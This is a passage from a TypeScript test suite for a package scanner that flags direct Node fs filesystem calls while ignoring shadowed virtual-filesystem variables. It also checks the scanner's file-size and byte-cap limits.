        "} catch (fs) {",
        "  fs.readFile('/virtual/file');",
        "}",
        "try { fail(); } catch (fs) { fs.readFile('/virtual/same-line'); } fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "try { fail(); } catch (fs) { fs.readFile('/virtual/same-line'); } fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag block-local destructured declarations that shadow helpers", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-destructuring.js",
      [
        "import { readFile } from 'node:fs/promises';",
        "{ const other = 1; const { readFile } = makeVirtualFilesystem(); await readFile('/virtual/semicolon'); }",
        "{",
        "  const { readFile } = makeVirtualFilesystem();",
        "  await readFile('/virtual/file');",
        "}",
        "await readFile('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFile } from 'node:fs/promises';",
      "await readFile('/tmp/example');",
    ]);
  });

  it("does not flag function-scoped var shadows after their declaration block closes", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/var-shadow.js",
      [
        "import fs from 'node:fs';",
        "import { readFile } from 'node:fs/promises';",
        "function inspect(useVirtual) {",
        "  if (useVirtual) {",
        "    var fs = makeVirtualFilesystem();",
        "  }",
        "  return fs.readFile('/virtual/file');",
        "}",
        "function inspectDestructured(useVirtual) {",
        "  if (useVirtual) {",
        "    var { readFile } = makeVirtualFilesystem();",
        "  }",
        "  return readFile('/virtual/file');",
        "}",
        "function sameLine(useVirtual) { if (useVirtual) { var fs = makeVirtualFilesystem(); } return fs.readFile('/virtual/same-line'); } fs.writeFileSync('/tmp/after-same-line');",
        "function direct(useVirtual) {",
        "  var fs = makeVirtualFilesystem();",
        "  return fs.readFile('/virtual/direct');",
        "}",
        "fs.rmSync('/tmp/after-direct');",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "import { readFile } from 'node:fs/promises';",
      "function sameLine(useVirtual) { if (useVirtual) { var fs = makeVirtualFilesystem(); } return fs.readFile('/virtual/same-line'); } fs.writeFileSync('/tmp/after-same-line');",
      "fs.rmSync('/tmp/after-direct');",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag block-local array destructuring that shadows helpers", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-array-destructuring.js",
      [
        "import { readFile } from 'node:fs/promises';",
        "{",
        "  const [readFile] = makeVirtualFilesystem();",
        "  await readFile('/virtual/file');",
        "}",
        "await readFile('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFile } from 'node:fs/promises';",
      "await readFile('/tmp/example');",
    ]);
  });

  it("does not treat local fs-shaped destructuring sources as raw fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/local-filesystem-destructure.js",
      [
        "import { readFile } from 'node:fs/promises';",
        "{",
        "  const filesystem = makeVirtualFilesystem();",
        "  const { readFile } = filesystem;",
        "  await readFile('/virtual/file');",
        "}",
        "await readFile('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFile } from 'node:fs/promises';",
      "await readFile('/tmp/example');",
    ]);
  });

  it("does not derive fs helper aliases from block-local shadowed namespace aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-derived.js",
      [
        "import fs from 'node:fs';",
        "{",
        "  const fs = makeVirtualFilesystem();",
        "  const { readFile } = fs;",
        "  await readFile('/virtual/file');",
        "  const fsp = fs.promises;",
        "  await fsp.writeFile('/virtual/file', value);",
        "}",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not leak block-local raw fs aliases into later local fs-shaped objects", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/scoped-raw-alias.js",
      [
        "{",
        "  const fs = require('node:fs');",
        "  fs.readFileSync('/tmp/example');",
        "}",
        "const fs = makeVirtualFilesystem();",
        "fs.readFile('/virtual/file');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const fs = require('node:fs');",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline function parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-function.js",
      [
        "import fs from 'node:fs';",
        "function inspect(fs) {",
        "  return fs.readFile('/virtual/file');",
        "}",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline arrow parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-arrow.js",
      [
        "import fs from 'node:fs';",
        "const inspect = (",
        "  fs,",
        ") => {",
        "  return fs.readFile('/virtual/file');",
        "};",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline async arrow parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-async-arrow.js",
      [
        "import fs from 'node:fs';",
        "const inspect = async (",
        "  fs,",
        ") => {",
        "  return fs.readFile('/virtual/file');",
        "};",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline typed parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-typed-params.ts",
      [
        "import fs from 'node:fs';",
        "const inspect = (",
        "  fs: VirtualFilesystem,",
        "): string => {",
        "  return fs.readFile('/virtual/file');",
        "};",
        "function load(",
        "  fs: VirtualFilesystem,",
        "): string {",
        "  return fs.readFile('/virtual/file');",
        "}",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag same-line method parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-method.ts",
      [
        "import fs from 'node:fs';",
        "fs.readFileSync('/tmp/before'); const plugin = { inspect(fs: VirtualFilesystem) { return fs.readFile('/virtual/file'); } }; fs.writeFileSync('/tmp/after', data);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/before'); const plugin = { inspect(fs: VirtualFilesystem) { return fs.readFile('/virtual/file'); } }; fs.writeFileSync('/tmp/after', data);",
    ]);
  });

  it("does not flag multiline class method parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-class-method.ts",
      [
        "import fs from 'node:fs';",
        "class Plugin {",
        "  inspect(",
        "    fs: VirtualFilesystem,",
        "  ) {",
        "    return fs.readFile('/virtual/file');",
        "  }",
        "}",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline object method parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-object-method.ts",
      [
        "import fs from 'node:fs';",
        "const plugin = {",
        "  inspect(",
        "    fs: VirtualFilesystem,",
        "  ) {",
        "    return fs.readFile('/virtual/file');",
        "  },",
        "};",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline parameter shadow calls on the closing signature line", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-arrow-close.js",
      [
        "import fs from 'node:fs';",
        "const inspect = (",
        "  fs,",
        ") => fs.readFile('/virtual/file');",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag multiline arrow expression-body parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-arrow-expression.ts",
      [
        "import fs from 'node:fs';",
        "const inspect = (",
        "  fs,",
        ") =>",
        "  fs.readFile('/virtual/file');",
        "const inspectAsync = async (",
        "  fs: VirtualFilesystem,",
        "): Promise<string> =>",
        "  fs.readFile('/virtual/typed');",
        "const inspectTernary = async (",
        "  fs: VirtualFilesystem,",
        "): Promise<string> =>",
        "  useFirst ?",
        "    fs.readFile('/virtual/first') :",
        "    fs.readFile('/virtual/second');",
        "const inspectObject = (",
        "  fs: VirtualFilesystem,",
        "): { value: string } =>",
        "  ({",
        "    value: fs.readFile('/virtual/object'),",
        "  });",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("only flags destructured fs helper calls when they come from fs imports", () => {
    const localHelperFindings = scanPackageDryRunFilesystemContent(
      "dist/local.js",
      [
        "const moduleName = 'fs/promises';",
        "async function readFile(path) { return path; }",
        "await readFile('/tmp/example');",
      ].join("\n"),
    );
    const aliasedImportFindings = scanPackageDryRunFilesystemContent(
      "dist/imported.js",
      ["import { readFile as rf } from 'node:fs/promises';", "await rf('/tmp/example');"].join(
        "\n",
      ),
    );

    expect(localHelperFindings).toHaveLength(0);
    expect(aliasedImportFindings.map((finding) => finding.evidence)).toEqual([
      "import { readFile as rf } from 'node:fs/promises';",
      "await rf('/tmp/example');",
    ]);
  });

  it("detects sync destructured fs calls and multiline destructured imports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "import { readFileSync } from 'node:fs';",
        "import {",
        "  writeFile",
        "} from 'node:fs/promises';",
        "const raw = readFileSync('/tmp/example', 'utf8');",
        "await writeFile('/tmp/example', raw);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFileSync } from 'node:fs';",
      "import {\n  writeFile\n} from 'node:fs/promises';",
      "const raw = readFileSync('/tmp/example', 'utf8');",
      "await writeFile('/tmp/example', raw);",
    ]);
  });

  it("detects destructured dynamic fs imports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "const { readFile } = await import('node:fs/promises');",
        "const { writeFile: wf } = await import('node:fs/promises');",
        "await readFile('/tmp/example', 'utf8');",
        "await wf('/tmp/example', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const { readFile } = await import('node:fs/promises');",
      "const { writeFile: wf } = await import('node:fs/promises');",
      "await readFile('/tmp/example', 'utf8');",
      "await wf('/tmp/example', payload);",
    ]);
  });

  it("detects nested fs.promises destructuring from raw fs modules", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/nested-promises.js",
      [
        "const { promises: { readFile, writeFile: wf } } = require('node:fs');",
        "const { promises: { stat } } = await import('node:fs');",
        "await readFile('/tmp/example', 'utf8');",
        "await wf('/tmp/example', payload);",
        "await stat('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const { promises: { readFile, writeFile: wf } } = require('node:fs');",
      "const { promises: { stat } } = await import('node:fs');",
      "await readFile('/tmp/example', 'utf8');",
      "await wf('/tmp/example', payload);",
      "await stat('/tmp/example');",
    ]);
  });

  it("skips oversized files before reading storage content", async () => {
    const storage = {
      get: async () => {
        throw new Error("oversized file should not be read");
      },
    };

    const result = await runPackageDryRunFilesystemScan({ storage } as never, {
      files: [
        {
          path: "dist/large.js",
          storageId: "storage:large",
          size: 257 * 1024,
          contentType: "application/javascript",
        },
      ],
    });

    expect(result.rawFsUsage.totalCount).toBe(0);
    expect(result.fsSafeUsage.totalCount).toBe(0);
  });

  it("skips oversized storage blobs even when file metadata is stale", async () => {
    const storage = {
      get: async () => ({
        size: 257 * 1024,
        text: async () => {
          throw new Error("oversized blob should not be read");
        },
      }),
    };

    const result = await runPackageDryRunFilesystemScan({ storage } as never, {
      files: [
        {
          path: "dist/stale-size.js",
          storageId: "storage:stale-size",
          size: 12,
          contentType: "application/javascript",
        },
      ],
    });

    expect(result.rawFsUsage.totalCount).toBe(0);
    expect(result.fsSafeUsage.totalCount).toBe(0);
  });

  it("enforces the release byte cap with actual storage blob sizes", async () => {
    let textReads = 0;
    const storage = {
      get: async () => ({
        size: 256 * 1024,
        text: async () => {
          textReads += 1;
          return "import fs from 'node:fs';";
        },
      }),
    };

    const result = await runPackageDryRunFilesystemScan({ storage } as never, {
      files: Array.from({ length: 9 }, (_, index) => ({
        path: `dist/file-${index}.js`,
        storageId: `storage:file-${index}`,
        size: 1,
        contentType: "application/javascript",
      })),
    });

    expect(textReads).toBe(8);
    expect(result.rawFsUsage.totalCount).toBe(8);
  });
});
